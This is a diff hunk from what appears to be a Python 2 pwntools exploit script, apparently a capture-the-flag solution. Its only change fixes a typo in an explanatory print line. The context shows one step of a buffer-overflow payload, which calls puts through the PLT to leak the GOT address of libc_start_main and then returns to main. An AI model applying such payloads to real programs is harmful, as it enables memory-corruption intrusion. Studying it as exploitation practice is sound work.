@@ -8,7 +8,7 @@ main = elf.symbols['main']
 print "I decide to leak libc_start_main first because it has run before we get into main function"
 print "It must be real address in its GOT"
 
-print "First, leak address of libc_start_main and retrurn main again"
+print "First, leak address of libc_start_main and return to main again"
 payload  = 'padding' + p32(puts_plt) + p32(main) + p32(libc_start_main_got)
 r.sendline(payload)
 
